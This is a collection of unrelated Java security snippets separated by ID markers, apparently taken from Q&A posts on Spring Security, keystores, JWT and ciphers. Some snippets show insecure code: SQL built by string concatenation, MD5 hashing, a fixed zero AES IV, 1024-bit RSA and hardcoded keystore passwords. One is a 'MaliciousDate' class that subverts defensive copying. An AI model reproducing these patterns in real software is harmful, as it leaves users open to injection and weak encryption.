		System.out.println(text);
		System.out.println(decode(text));
		
	}
	private static String decode(String input) {
		// TODO Auto-generated method stub
		StringBuffer output = new StringBuffer();
		for(int i = 0; i < input.length(); i++)
		{
			String ch = input.charAt(i)+"";
			if(hm.containsValue(ch))
			{
				for (Entry<String, String> entry : hm.entrySet()) {
		            if (entry.getValue().equals(ch)) {
		            	output.append(entry.getKey());
		            }
				}
			}
			else
			{
				output.append(ch);
			}
		}
		return output.toString();
	}
	private static String encode(String input) {
		// TODO Auto-generated method stub
		StringBuffer output = new StringBuffer();
		for(int i = 0; i < input.length(); i++)
		{
			String ch = input.charAt(i)+"";
			if(hm.containsKey(ch))
			{
				output.append(hm.get(ch));
			}
			else
			{
				output.append(ch);
			}
		}
		return output.toString();
	}
---UNIQUEIDFORSNIP---|174879567|    @PostAuthorize("returnObject.widget.owner.id == principal.id")
    public Widget getWidgetById(long id) {
       // ...
    return widget;
    }
    
---UNIQUEIDFORSNIP---|174879569|    <global-method-security pre-post-annotations="enabled" />
---UNIQUEIDFORSNIP---|174879571|    @PreAuthorize("(hasRole('ROLE_USER') and #post.text.length() <= 140)
      or hasRole('ROLE_PREMIUM')")
    
---UNIQUEIDFORSNIP---|174879577|    @PreAuthorize("hasRole('ROLE_ADMIN') 
    or @mySecurityService.isPostOwner(#post_id, principal.id))")
---UNIQUEIDFORSNIP---|175132873|    asadmin enable-secure-admin --adminalias=myNewAlias --instancealias myNewAlias
---UNIQUEIDFORSNIP---|175132877|    keytool -importkeystore -deststorepass changeit -destkeypass changeit -destkeystore keystore.jks -srckeystore myOwnCert.p12 -srcstoretype PKCS12 -srcstorepass changeit -alias myOwnAlias
    keytool -importkeystore -deststorepass changeit -destkeypass changeit -destkeystore cacerts.jks -srckeystore myOwnCert.p12 -srcstoretype PKCS12 -srcstorepass changeit -alias myOwnAlias
---UNIQUEIDFORSNIP---|175132881|    #Restart your domain without secure-admin
    $GLASSFISH_HOME/bin/asadmin disable-secure-admin
    
    
    #Go to your domain config folder to remove the certificates:
    cd $GLASSFISH_HOME/domains/domain1/config/
    keytool -delete -alias s1as -keystore keystore.jks -storepass changeit
    keytool -delete -alias glassfish-instance -keystore keystore.jks -storepass changeit
    keytool -delete -alias glassfish-instance -keystore cacerts.jks -storepass changeit
    keytool -delete -alias s1as -keystore cacerts.jks -storepass changeit
---UNIQUEIDFORSNIP---|175132885|    $GLASSFISH_HOME/bin/asadmin enable-secure-admin --adminalias=myOwnAlias --instancealias myOwnAlias
    
    $GLASSFISH_HOME/bin/asadmin restart-domain
---UNIQUEIDFORSNIP---|175146830|    field.setAccessible(true);
---UNIQUEIDFORSNIP---|175558525|    query("SELECT * FROM table WHERE col = '" + encrypt(x) + "';");
---UNIQUEIDFORSNIP---|175580747|	public static String convertStringToMD5Hash(String string) {
		byte[] hash;
		try {
			hash = MessageDigest.getInstance("MD5").digest(string.getBytes("UTF-8"));
		} catch (NoSuchAlgorithmException e) {
			throw new RuntimeException("MD5 not supported?", e);
		} catch (UnsupportedEncodingException e) {
			throw new RuntimeException("UTF-8 not supported?", e);
		}
		StringBuilder hex = new StringBuilder(hash.length * 2);
		for (byte b : hash) {
			int i = (b & 0xFF);
			if (i < 0x10)
				hex.append('0');
			hex.append(Integer.toHexString(i));
		}
		return hex.toString();
	}
---UNIQUEIDFORSNIP---|175851483|    public class CustomDaoAuthenticationProvider extends AbstractUserDetailsAuthenticationProvider {
       
    }
---UNIQUEIDFORSNIP---|175851485|    @Configuration
    @WebSecurity // optional?
    public class SecurityConfiguration extends WebSecurityConfigurerAdapter {
    
    	@Autowired 
        private UserDetailsService userService; // can be replaced by whatever service implements UserDetailsService
    
    	@Bean
    	public CustomDaoAuthenticationProvider daoAuthenticationProvider() {
    		CustomDaoAuthenticationProvider authenticationProvider = new CustomDaoAuthenticationProvider();
    		authenticationProvider.setPasswordEncoder(passwordEncoder());
    		authenticationProvider.setUserDetailsService(userService);
    		System.out.println("Using my custom DaoAuthenticationProvider");
    		return authenticationProvider;
    	}
    
    	@Bean
    	public PasswordEncoder passwordEncoder() {
    		return new BCryptPasswordEncoder();
    	}
        @Override
        public void configure(AuthenticationManagerBuilder auth) throws Exception {
		    auth.authenticationProvider(daoAuthenticationProvider());
	    }
        // ...
    }
---UNIQUEIDFORSNIP---|175910525|    public String login() {
    
        FacesContext context = FacesContext.getCurrentInstance();
        HttpServletRequest request = (HttpServletRequest) context.getExternalContext().getRequest();
    
        try {
            request.login(this.userName, this.password);
            return "index?faces-redirect=true";
        } catch (Exception e) {
            return "error?faces-redirect=true";
        }
---UNIQUEIDFORSNIP---|175982905|    /**
     * Authenticate the user making this request, based on the specified
     * login configuration.  Return <code>true if any specified
     * constraint has been satisfied, or <code>false if we have
     * created a response challenge already.
     *
     * @param request Request we are processing
     * @param response Response we are creating
     * @param config    Login configuration describing how authentication
     *              should be performed
     *
     * @exception IOException if an input/output error occurs
     */
    public boolean authenticate(Request request,
                                Response response,
                                LoginConfig config)
        throws IOException {
        // Have we already authenticated someone?
        Principal principal = request.getUserPrincipal();
        String ssoId = (String) request.getNote(Constants.REQ_SSOID_NOTE);
        if (principal != null) {
            if (log.isDebugEnabled())
                log.debug("Already authenticated '" + principal.getName() + "'");
            // Associate the session with any existing SSO session
            if (ssoId != null)
                associate(ssoId, request.getSessionInternal(true));
            return (true);
        }
        // Is there an SSO session against which we can try to reauthenticate?
        if (ssoId != null) {
            if (log.isDebugEnabled())
                log.debug("SSO Id " + ssoId + " set; attempting " +
                          "reauthentication");
            /* Try to reauthenticate using data cached by SSO.  If this fails,
               either the original SSO logon was of DIGEST or SSL (which
               we can't reauthenticate ourselves because there is no
               cached username and password), or the realm denied
               the user's reauthentication for some reason.
               In either case we have to prompt the user for a logon */
            if (reauthenticateFromSSO(ssoId, request))
                return true;
        }
        // Validate any credentials already included with this request
        String username = null;
        String password = null;
        MessageBytes authorization = 
            request.getCoyoteRequest().getMimeHeaders()
            .getValue("authorization");
        
        if (authorization != null) {
            authorization.toBytes();
            ByteChunk authorizationBC = authorization.getByteChunk();
            if (authorizationBC.startsWithIgnoreCase("basic ", 0)) {
                authorizationBC.setOffset(authorizationBC.getOffset() + 6);
                // FIXME: Add trimming
                // authorizationBC.trim();
                
                CharChunk authorizationCC = authorization.getCharChunk();
                Base64.decode(authorizationBC, authorizationCC);
                
                // Get username and password
                int colon = authorizationCC.indexOf(':');
                if (colon < 0) {
                    username = authorizationCC.toString();
                } else {
                    char[] buf = authorizationCC.getBuffer();
                    username = new String(buf, 0, colon);
                    password = new String(buf, colon + 1, 
                            authorizationCC.getEnd() - colon - 1);
                }
                
                authorizationBC.setOffset(authorizationBC.getOffset() - 6);
            }
            principal = context.getRealm().authenticate(username, password);
            if (principal != null) {
                register(request, response, principal, Constants.BASIC_METHOD,
                         username, password);
                return (true);
            }
        }
        
        // Send an "unauthorized" response and an appropriate challenge
        MessageBytes authenticate = 
            response.getCoyoteResponse().getMimeHeaders()
            .addValue(AUTHENTICATE_BYTES, 0, AUTHENTICATE_BYTES.length);
        CharChunk authenticateCC = authenticate.getCharChunk();
        authenticateCC.append("Basic realm=\"");
        if (config.getRealmName() == null) {
            authenticateCC.append(request.getServerName());
            authenticateCC.append(':');
            authenticateCC.append(Integer.toString(request.getServerPort()));
        } else {
            authenticateCC.append(config.getRealmName());
        }
        authenticateCC.append('\"');        
        authenticate.toChars();
        response.sendError(HttpServletResponse.SC_UNAUTHORIZED);
        //response.flushBuffer();
        return (false);
    }
---UNIQUEIDFORSNIP---|176106157|    <InFaultFlow>
        <handler name="PolicyBasedSecurityInHandler" class="org.apache.rampart.handler.RampartReceiver">
            <order phase="Security" phaseFirst="true"/>
        </handler>
        <handler name="SecurityInHandler" class="org.apache.rampart.handler.WSDoAllReceiver">
            <order phase="Security"/>
        </handler>
        <handler name="PostDispatchVerificationHandler" class="org.apache.rampart.handler.PostDispatchVerificationHandler">
            <order phase="Dispatch" phaseLast="true"/>
        </handler>
    </InFaultFlow> 
---UNIQUEIDFORSNIP---|176658032|    private RedirectStrategy redirectStrategy = new DefaultRedirectStrategy();
       ...
	   .formLogin()
       .loginPage("/login")
       .successHandler(new AuthenticationSuccessHandler() {
		@Override
		public void onAuthenticationSuccess(HttpServletRequest request, HttpServletResponse response,
				Authentication authentication) throws IOException, ServletException {
			redirectStrategy.sendRedirect(request, response, "/");
		}
	})
---UNIQUEIDFORSNIP---|176668579|    @Provider
    @Priority(Priorities.AUTHENTICATION)
    public class AuthenticationFilter implements ContainerRequestFilter {
        @Override
        public void filter(ContainerRequestContext requestContext) throws IOException {
            
            // Extract and validate the API key from the request
            String apiKey = requestContext.getHeaderString("API-Key");
            ...
        }
    }
---UNIQUEIDFORSNIP---|176728221|    public static void main( String[] args ) throws NoSuchAlgorithmException, NoSuchProviderException, InvalidKeyException, IllegalStateException, SignatureException, KeyStoreException, CertificateException, FileNotFoundException, IOException
    {
    	Security.addProvider(new BouncyCastleProvider());
    	// yesterday
    	Date validityBeginDate = new Date(System.currentTimeMillis() - 24 * 60 * 60 * 1000);
    	// in 2 years
    	Date validityEndDate = new Date(System.currentTimeMillis() + 2 * 365 * 24 * 60 * 60 * 1000);
    	// GENERATE THE PUBLIC/PRIVATE RSA KEY PAIR
    	KeyPairGenerator keyPairGenerator = KeyPairGenerator.getInstance("RSA", "BC");
    	keyPairGenerator.initialize(1024, new SecureRandom());
    	KeyPair keyPair = keyPairGenerator.generateKeyPair();
    	// GENERATE THE X509 CERTIFICATE
    	X509V1CertificateGenerator certGen = new X509V1CertificateGenerator();
    	X500Principal dnName = new X500Principal("CN=" + "username");
    	certGen.setSerialNumber(new BigInteger("100"));
    	certGen.setSubjectDN(dnName);
    	certGen.setIssuerDN(dnName); // use the same
    	certGen.setNotBefore(validityBeginDate);
    	certGen.setNotAfter(validityEndDate);
    	certGen.setPublicKey(keyPair.getPublic());
    	certGen.setSignatureAlgorithm("SHA256WithRSAEncryption");
    	X509Certificate cert = certGen.generate(keyPair.getPrivate(), "BC");
    	KeyStore clientKeystore = KeyStore.getInstance("PKCS12", "BC");
    	clientKeystore.load(null, null);
    	clientKeystore.setKeyEntry("mkey", keyPair.getPrivate(), null, new X509Certificate[] { cert });
    	clientKeystore.store(new FileOutputStream("admin.pkcs"), "pass".toCharArray());
    }
---UNIQUEIDFORSNIP---|176933796|if (SecurityUtils.getPrincipal().isPermitted("messages:publish:*"))
---UNIQUEIDFORSNIP---|177045169|    /**
     * Signs the constructed JWT using the specified algorithm with 
     * the specified key, producing a JWS.
     *
     * <p>
     * This is a convenience method: the string argument is first
     * BASE64-decoded to a byte array and this resulting byte array is
     * used to invoke {@link #signWith(SignatureAlgorithm, byte[])}.
     * </p>
     *
     * @param alg                    the JWS algorithm to use to digitally
     *                               sign the JWT, thereby producing a JWS.
     *
     * @param base64EncodedSecretKey the BASE64-encoded algorithm-specific
     *                               signing key to use to digitally sign
     *                               the JWT.
     *
     * @return the builder for method chaining.
     */
    JwtBuilder signWith(SignatureAlgorithm alg, String base64EncodedSecretKey);
---UNIQUEIDFORSNIP---|177045174|    | If you're signing with: | your key (byte array) length MUST be: |
    | ----------------------- | ------------------------------------- |
    | HMAC SHA 256            | >= 256 bits (32 bytes)                |
    | HMAC SHA 384            | >= 384 bits (48 bytes)                |
    | HMAC SHA 512            | >= 512 bits (64 bytes)                |
---UNIQUEIDFORSNIP---|177045178|    //creates a 256-bit secure-random key:
    MacProvider.generateKey(SignatureAlgorithm.HS256);
    
    //creates a 384-bit secure-random key:
    MacProvider.generateKey(SignatureAlgorithm.HS384);
    
    //creates a 512-bit secure-random key (the default):
    MacProvider.generateKey();
---UNIQUEIDFORSNIP---|177045180|    SecretKey key = MacProvider.generateKey();
    byte[] keyBytes = key.getEncoded();
    
    String base64Encoded = TextCodec.BASE64.encode(keyBytes);
---UNIQUEIDFORSNIP---|177045182|    Jwts.builder()
        //...
        .signWith(SignatureAlgorithm.HS512, base64Encoded)
        .compact();
---UNIQUEIDFORSNIP---|177187795|    FacesContext.getCurrentInstance().getExternalContext().getSessionMap().put("userID", email);
---UNIQUEIDFORSNIP---|177187799|    <session-config>
       <session-timeout>60</session-timeout>
    </session-config>
---UNIQUEIDFORSNIP---|177224013|    SecureRandom saltRandomizer = new SecureRandom();
---UNIQUEIDFORSNIP---|177224015|    SecureRandom.getInstance("SHA1PRNG", "SUN");
---UNIQUEIDFORSNIP---|177359804|    final Cipher cipher = Cipher.getInstance("RSA");
---UNIQUEIDFORSNIP---|177359806|            final Cipher cipher = Cipher.getInstance("RSA/ECB/OAEPWITHSHA-256ANDMGF1PADDING");
---UNIQUEIDFORSNIP---|177359808|        cipherText = cipher.doFinal(text.getBytes());
---UNIQUEIDFORSNIP---|177359810|        cipherText = cipher.doFinal(text.getBytes("UTF-8"));
---UNIQUEIDFORSNIP---|177584453|       boolean authorized = false;
       if (currentUser != null) {
            if (currentUser.getType().equals("BUYER")) {
                for (String s : access.getBuyer().getPages()) {
                    if (pageRequested.contains(s)) {
                        authorized = true;
                        break;
                    }
                }
            } else if (currentUser.getType().equals("SELLER")) {
                for (String s : access.getSeller().getPages()) {
                    if (pageRequested.contains(s)) {
                        authorized = true;
                        break;
                    }
                }
            } else if (currentUser.getType().equals("ADMINISTRATOR")) {
                for (String s : access.getAdministrator().getPages()) {
                    if (pageRequested.contains(s)) {
                        authorized = true;
                        break;
                    }
                }
            }
        }
 
        if (authorized) {
            chain.doFilter(request, response);
        } else {
            resp.sendRedirect("main.xhtml");
        }
---UNIQUEIDFORSNIP---|177862679|    @Target(ElementType.TYPE)
    @Retention(RetentionPolicy.RUNTIME)
    public @interface RequiresAuthentication {
       public String[] roles();
    }
---UNIQUEIDFORSNIP---|177916184|    cipher = Cipher.getInstance("AES/CBC/PKCS5Padding");
---UNIQUEIDFORSNIP---|177916188|    cipher = Cipher.getInstance("AES/CBC/NoPadding");
---UNIQUEIDFORSNIP---|177934102|        server.port=8443
        server.ssl.key-store=classpath:keystore.jks
        server.ssl.key-store-password=secret
        server.ssl.key-password=another-secret
    Where keystore.jks is the path to your Java keystore that holds your SSL certificate. See [Spring Boot Docs](http://docs.spring.io/spring-boot/docs/current/reference/html/howto-embedded-servlet-containers.html#howto-configure-ssl) for more info.
---UNIQUEIDFORSNIP---|177934106|        <!-- Define a SSL Coyote HTTP/1.1 Connector on port 8443 -->
        <Connector
            protocol="org.apache.coyote.http11.Http11NioProtocol"
            port="8443" maxThreads="200"
            scheme="https" secure="true" SSLEnabled="true"
            keystoreFile="${user.home}/.keystore" keystorePass="changeit"
            clientAuth="false" sslProtocol="TLS"/>
    This example is for Tomcat 7, but the process is similar for other Tomcat versions. See [Tomcat SSL](https://tomcat.apache.org/tomcat-7.0-doc/ssl-howto.html) for more information.
---UNIQUEIDFORSNIP---|177934251|    String originalURI = (String) externalContext.getRequestMap().get(RequestDispatcher.FORWARD_REQUEST_URI);
---UNIQUEIDFORSNIP---|177934253|    externalContext.getSessionMap().put("user", user);
---UNIQUEIDFORSNIP---|178008131|    class MaliciousDate {
        private final List<MaliciousDate> dates;
        public MaliciousDate(List<MaliciousDate> dates) {
            this.dates = dates;
        }
        @Override public MaliciousDate clone() {
            MalicousDate other = (MalicousDate)super.clone(); // Or new MalicousDate
            synchronized (dates) {
                dates.add(other);
            }
            return other; // Or return this;
        }
    }
---UNIQUEIDFORSNIP---|178008134|    public Period(Date start, Date end) {
        // Failing defensive copy.
        start = (Date)start.clone();
        end   = (Date)end  .clone();
        if (start.compareTo(end) > 0)
            throw new IllegalArgumentExcpetion();
        this.start = start;
        this.end = end;
    } 
---UNIQUEIDFORSNIP---|178008138|    List<MaliciousDate> dates = new ArrayList<>()
    Date start = new MaliciousDate(dates);
    Date end = new MaliciousDate(dates);
    Period p = new Period(start, end);
    dates.get(1).setYear(78); // Modifies internals of p!
---UNIQUEIDFORSNIP---|178132120|    public class InstallCert {
	public static void main(String[] args) throws Exception {
		
		String httpsUrl = null;
		String host;
		int port;
		char[] passphrase;
		if (args.length == 0) {
			httpsUrl = "https://www.google.com/";
			port = 443;
			host = "www.google.com";
			passphrase = "changeit".toCharArray();
		} else if ((args.length == 1) || (args.length == 2)) {
			String[] c = args[0].split(":");
			host = c[0];
			port = (c.length == 1) ? 443 : Integer.parseInt(c[1]);
			String p = (args.length == 1) ? "changeit" : args[1];
			passphrase = p.toCharArray();
		} else {
			System.out.println("Usage: java InstallCert [:port] [passphrase]");
			return;
		}
		File file = new File("jssecacerts");
		if (file.isFile() == false) {
			char SEP = File.separatorChar;
			File dir = new File(System.getProperty("java.home") + SEP + "lib"
					+ SEP + "security");
			file = new File(dir, "jssecacerts");
			if (file.isFile() == false) {
				file = new File(dir, "cacerts");
			}
		}
		System.out.println("Loading KeyStore " + file + "...");
		InputStream in = new FileInputStream(file);
		KeyStore ks = KeyStore.getInstance(KeyStore.getDefaultType());
		ks.load(in, passphrase);
		in.close();
		SSLContext context = SSLContext.getInstance("TLS");
		TrustManagerFactory tmf = TrustManagerFactory
				.getInstance(TrustManagerFactory.getDefaultAlgorithm());
		tmf.init(ks);
		X509TrustManager defaultTrustManager = (X509TrustManager) tmf
				.getTrustManagers()[0];
		SavingTrustManager tm = new SavingTrustManager(defaultTrustManager);
		context.init(null, new TrustManager[] { tm }, null);
		SSLSocketFactory factory = context.getSocketFactory();
		System.out.println("Opening connection to " + host + ":" + port + "...");
		URL url = new URL(httpsUrl);
		Proxy p = new Proxy(Proxy.Type.SOCKS, new InetSocketAddress("176.9.240.109", 1080));
		HttpsURLConnection conn = (HttpsURLConnection)url.openConnection(p);
		conn.setSSLSocketFactory(factory);
		conn.setConnectTimeout(3000); // 3 seconds.
		conn.setReadTimeout(3000); // 3 seconds
		conn.setRequestProperty("User-Agent", "Mozilla/5.0 (Windows NT 6.0; WOW64; rv:19.0) Gecko/20100101 Firefox/19.0");
		try {
			System.out.println("Starting SSL handshake...");
			conn.connect();
			System.out.println();
			System.out.println("No errors, certificate is already trusted");
		} catch (SSLException e) {
			System.out.println();
			e.printStackTrace(System.out);
		} finally {
			conn.disconnect();
		}
		X509Certificate[] chain = tm.chain;
		if (chain == null) {
			System.out.println("Could not obtain server certificate chain");
			return;
		}
		BufferedReader reader = new BufferedReader(new InputStreamReader(
				System.in));
		System.out.println();
		System.out.println("Server sent " + chain.length + " certificate(s):");
		System.out.println();
		MessageDigest sha1 = MessageDigest.getInstance("SHA1");
		MessageDigest md5 = MessageDigest.getInstance("MD5");
		for (int i = 0; i < chain.length; i++) {
			X509Certificate cert = chain[i];
			System.out.println(" " + (i + 1) + " Subject "
					+ cert.getSubjectDN());
			System.out.println("   Issuer  " + cert.getIssuerDN());
			sha1.update(cert.getEncoded());
			System.out.println("   sha1    " + toHexString(sha1.digest()));
			md5.update(cert.getEncoded());
			System.out.println("   md5     " + toHexString(md5.digest()));
			System.out.println();
		}
		System.out
		.println("Enter certificate to add to trusted keystore or 'q' to quit: [1]");
		String line = reader.readLine().trim();
		int k;
		try {
			k = (line.length() == 0) ? 0 : Integer.parseInt(line) - 1;
		} catch (NumberFormatException e) {
			System.out.println("KeyStore not changed");
			return;
		}
		X509Certificate cert = chain[k];
		String alias = host + "-" + (k + 1);
		ks.setCertificateEntry(alias, cert);
		/*
        OutputStream out = new FileOutputStream("jssecacerts");
        ks.store(out, passphrase);
        out.close();
		 */
		System.out.println();
		System.out.println(cert);
		System.out.println();
		System.out
		.println("Added certificate to keystore 'jssecacerts' using alias '"
				+ alias + "'");
	}
	private static final char[] HEXDIGITS = "0123456789abcdef".toCharArray();
	private static String toHexString(byte[] bytes) {
		StringBuilder sb = new StringBuilder(bytes.length * 3);
		for (int b : bytes) {
			b &= 0xff;
			sb.append(HEXDIGITS[b >> 4]);
			sb.append(HEXDIGITS[b & 15]);
			sb.append(' ');
		}
		return sb.toString();
	}
	private static class SavingTrustManager implements X509TrustManager {
		private final X509TrustManager tm;
		private X509Certificate[] chain;
		SavingTrustManager(X509TrustManager tm) {
			this.tm = tm;
		}
		public X509Certificate[] getAcceptedIssuers() {
			throw new UnsupportedOperationException();
		}
		public void checkClientTrusted(X509Certificate[] chain, String authType)
				throws CertificateException {
			throw new UnsupportedOperationException();
		}
		public void checkServerTrusted(X509Certificate[] chain, String authType)
				throws CertificateException {
			this.chain = chain;
			tm.checkServerTrusted(chain, authType);
		}
	}
    }
---UNIQUEIDFORSNIP---|178149846|    ...
    at Calendar_Algorithm$Con.send_courses_to_server(Calendar_Algorithm.java:789)
    at Calendar_Algorithm$Con.run(Calendar_Algorithm.java:773)
    at Calendar_Algorithm.send_courses_to_server(Calendar_Algorithm.java:761)
    ...
    at sun.plugin.javascript.JSInvoke.invoke(Unknown Source)
    ...
---UNIQUEIDFORSNIP---|178271479|    echo '539B333B39706D149028CFE1D9D4A407' | xxd -r -p
---UNIQUEIDFORSNIP---|178271481|    -K 80000000000000000000000000000000000000000000000000000000000001
---UNIQUEIDFORSNIP---|178271483|    xxd -p
---UNIQUEIDFORSNIP---|178271486|    echo '539B333B39706D149028CFE1D9D4A407' | xxd -r -p | openssl enc -aes-256-ecb -nopad  -d -K 8000000000000000000000000000000000000000000000000000000000000001 | xxd -p
---UNIQUEIDFORSNIP---|178271488|    80706050403020100807060504030201
---UNIQUEIDFORSNIP---|178271490|    807060504030201008070605040302
---UNIQUEIDFORSNIP---|178385380|    <j2se version="1.6">
---UNIQUEIDFORSNIP---|178437595|      encrypt(rand(6) + encryptable)
---UNIQUEIDFORSNIP---|178448647|      <authentication-manager>   
        <ldap-authentication-provider user-search-filter="(uid={0})"
          user-search-base="ou=people"
          group-role-attribute="cn" 
          group-search-base="ou=group"
          group-search-filter="(memberUid={1})"/> 
     </authentication-manager> 
---UNIQUEIDFORSNIP---|178607946|    @Override
    public Authentication attemptAuthentication(HttpServletRequest req,
                                            HttpServletResponse res) throws AuthenticationException {
    try {
        User creds = new ObjectMapper()
                .readValue(req.getInputStream(), User.class);
        return authenticationManager.authenticate(
                new UsernamePasswordAuthenticationToken(
                        creds.getUsername(),
                        creds.getUsername(),
                        new ArrayList<>())
        );
    } catch (IOException e) {
        throw new RuntimeException(e);
    }
---UNIQUEIDFORSNIP---|178617587|    @Component
    public class MyPermissionEvaluator implements PermissionEvaluator {
		private final Log logger = LogFactory.getLog(getClass());
	
		@Override
		public boolean hasPermission(Authentication auth, Object arg1, Object arg2) {
			logger.info("hasPermission "+auth+" - "+arg1+" - "+arg2+" ");
			if(arg2 instanceof String && arg1 instanceof MyProject){
          		MyProject project = (MyProject)arg1;
				if(((String) arg2).equals("read")){
					boolean result = hasPermissionReadProject(auth, project);					
					return result;
				}
			}
			return false;
		}
		@Override
		public boolean hasPermission(Authentication arg0, Serializable arg1,
			String arg2, Object arg3) {
			logger.info("hasPermission "+arg0+" - "+arg1+" - "+arg2+" - "+arg3+" ");
			return false;
		}
    }
---UNIQUEIDFORSNIP---|178617589|    <http auto-config="true">
	    <intercept-url pattern="/admin*" access="ROLE_ADMIN" />
	    <access-denied-handler error-page="accessDeniedPage"/>
    </http>
---UNIQUEIDFORSNIP---|178653897|    ...     
    cipher.init(Cipher.ENCRYPT_MODE, secret);
    InputStream is = new FileInputStream(choosedFile);
    OutputStream os = new CipherOutputStream(new FileOutputStream(choosedFile+".encrypted"), cipher);
    byte[] buffer = new byte[1024];
    int len;
    while ((len = is.read(buffer)) != -1) {
        os.write(buffer, 0, len);
    }
    is.close();
    os.close();
    ...
---UNIQUEIDFORSNIP---|178682208|/entity/{id}
---UNIQUEIDFORSNIP---|178714818|    <bean id="initialDirContextFactory" class="com.AA.BB.LdapConfig"/>
    <bean id="authoritiesPopulator" class="com.AA.BB.AuthoritiesPopulator"/>
    <bean id="userSearch" class="com.AA.BB.UserSearch">        
        <constructor-arg index="0" ref="initialDirContextFactory"/>
        <property name="searchSubtree" value="true"/>
    </bean>
    // UserSearch copied from FilterBasedLdapUserSearch, just modified the constructor
    public class UserSearch implements LdapUserSearch {
        public UserSearch(BaseLdapPathContextSource contextSource) {
            this.contextSource = contextSource;
            this.searchBase="OU=AA,DC=US,DC=BB,DC=local";
            this.searchFilter="(sAMAccountName={0})"
        }
    }
---UNIQUEIDFORSNIP---|178748905|    public boolean hasPermission(Authentication authentication, Object targetDomainObject, Object permission) 
---UNIQUEIDFORSNIP---|178748907|    @PreAuthorize("hasPermission(#opetussuunnitelmaDto, 'LUONTI')")
---UNIQUEIDFORSNIP---|178748909|    @PreAuthorize("isAuthenticated() and hasPermission(#opetussuunnitelmaDto, 'LUONTI')")
---UNIQUEIDFORSNIP---|178748911|    hasPermission('#targetDomainObject', 'permission')    // method1
    hasPermission('targetId', 'targetType', 'permission') // method2
---UNIQUEIDFORSNIP---|178766005|        public interface Authentication extends Principal, Serializable {}
---UNIQUEIDFORSNIP---|178774896|    public void setSecuredObjectsList(Object[] objects) {
        Map<String, String> rolesMap = new HashMap<String, String>();
        for (Object o:objects ) {
        	setSecuredObject(o, rolesMap);
        }
        super.setMethodRolesMap(rolesMap);
    }
    public void setSecuredObject(Object object, Map<String, String> rolesMap) {
        Class<?> cls = ClassHelper.getRealClass(object);
        findRoles(cls, rolesMap);
        if (rolesMap.isEmpty()) {
            LOG.warning("The roles map is empty, the service object is not protected");
        } else if (LOG.isLoggable(Level.FINE)) {
            for (Map.Entry<String, String> entry : rolesMap.entrySet()) {
                LOG.fine("Method: " + entry.getKey() + ", roles: " + entry.getValue());
            }
        }
    }
---UNIQUEIDFORSNIP---|178825065|    Field field = safe.getClass().getDeclaredField("secret");
    field.setAccessible(true);
    String secret = (String) field.get(safe);
---UNIQUEIDFORSNIP---|178828517|	System.setSecurityManager(new SecurityManager());
	Unsafe unsafe = Unsafe.getUnsafe();
---UNIQUEIDFORSNIP---|179200596|    for (Provider provider: Security.getProviders()) {
		System.out.println(provider.getName());
		for (Provider.Service s: provider.getServices()){
			if (s.getType().equals("Cipher"))
				System.out.println("\t"+s.getType()+" "+ s.getAlgorithm());
		}
    }
---UNIQUEIDFORSNIP---|179238737|    try {
     Class.forName( "your.fqdn.class.name" );
    } catch( ClassNotFoundException e ) {
     //my class isn't there!
    }
---UNIQUEIDFORSNIP---|179368963|    /* This is executed once, after user successful login. */
    Set<String> roles = new HashSet<String>();
    for (GrantedAuthority authority : authentication.getAuthorities()) {
       roles.add(authority.getAuthority());
    }
    
    session.setAttribute("userRoles", roles);
---UNIQUEIDFORSNIP---|179368970|    Set<String> roles = (Set<String>) session.getAttribute("userRoles");
    if(roles.contains("ROLE_ADMIN")) {
        putReadersInModel(model);
    }
---UNIQUEIDFORSNIP---|179390740|    if(URL.getProtocol().equalsIgnoreCase("https"))
     then replace "www." with " secure." 
---UNIQUEIDFORSNIP---|179653687|    import java.math.BigInteger;
    import java.security.SecureRandom;
    
    import org.bouncycastle.asn1.ASN1EncodableVector;
    import org.bouncycastle.asn1.DERInteger;
    import org.bouncycastle.asn1.DERSequence;
    import org.bouncycastle.crypto.generators.DHParametersGenerator;
    import org.bouncycastle.crypto.params.DHParameters;
    import org.bouncycastle.util.encoders.Base64;
    
    public class OpenSSLDHParamClone
    {
    
        public static void main(String[] args) throws Exception
        {
            DHParametersGenerator generator = new DHParametersGenerator();
            generator.init(1024, 80, new SecureRandom());
            DHParameters params = generator.generateParameters();
            // Generator G is set as random in params, but it has to be 2 to conform to openssl
            DHParameters realParams = new DHParameters(params.getP(), BigInteger.valueOf(2));
            ASN1EncodableVector seq = new ASN1EncodableVector();
            seq.add(new DERInteger(realParams.getP()));
            seq.add(new DERInteger(realParams.getG()));
            byte [] derEncoded = new DERSequence(seq).getDEREncoded();
            System.out.println("-----BEGIN DH PARAMETERS-----");
            String b64Encoded = new String(Base64.encode(derEncoded), "US-ASCII");
            while (b64Encoded.length() > 0) {
                int subStringLength = Math.min(64, b64Encoded.length());
                System.out.println(b64Encoded.substring(0, subStringLength));
                b64Encoded = b64Encoded.substring(subStringLength);
            }
            System.out.println("-----END DH PARAMETERS-----");
        }
    }
---UNIQUEIDFORSNIP---|179695334|    <input type="hidden"
        name="${_csrf.parameterName}"
        value="${_csrf.token}"/>
---UNIQUEIDFORSNIP---|179738242|    if (permission instanceof String) {
    	String permString = (String) permission;
    	Permission p;
    
    	try {
    		p = permissionFactory.buildFromName(permString);
    	}
    	catch (IllegalArgumentException notfound) {
    		p = permissionFactory.buildFromName(permString.toUpperCase());
    	}
    
    	if (p != null) {
    		return Arrays.asList(p);
   		}
    
    }
---UNIQUEIDFORSNIP---|180552326|    1. Matches a local configuration of OCSP signing authority for the
    certificate in question; or
---UNIQUEIDFORSNIP---|180552328|    2. Is the certificate of the CA that issued the certificate in
    question; or
---UNIQUEIDFORSNIP---|180552330|    3. Includes a value of id-ad-ocspSigning in an ExtendedKeyUsage
    extension and is issued by the CA that issued the certificate in
    question."
---UNIQUEIDFORSNIP---|180552332|    All definitive response messages SHALL be digitally signed. The key
    used to sign the response MUST belong to one of the following:
    
    -- the CA who issued the certificate in question
    -- a Trusted Responder whose public key is trusted by the requester
    -- a CA Designated Responder (Authorized Responder) who holds a specially
       marked certificate issued directly by the CA, indicating that the responder
       may issue OCSP responses for that CA
---UNIQUEIDFORSNIP---|180629374|    <uses-permission android:name="com.example.manyexampleapp.c2dm.permission.RECEIVE" />
    
---UNIQUEIDFORSNIP---|180629377|     <!-- This app has permission to register and receive data message. -->
        <uses-permission android:name="com.google.android.c2dm.permission.RECEIVE" />
---UNIQUEIDFORSNIP---|180971881|    AES_cipherInstance.init(Cipher.ENCRYPT_MODE, secretKey, new IvParameterSpec(new byte[16]);
---UNIQUEIDFORSNIP---|180971883|    AES_cipherInstance.init(Cipher.DECRYPT_MODE, secretKey, new IvParameterSpec(new byte[16]));
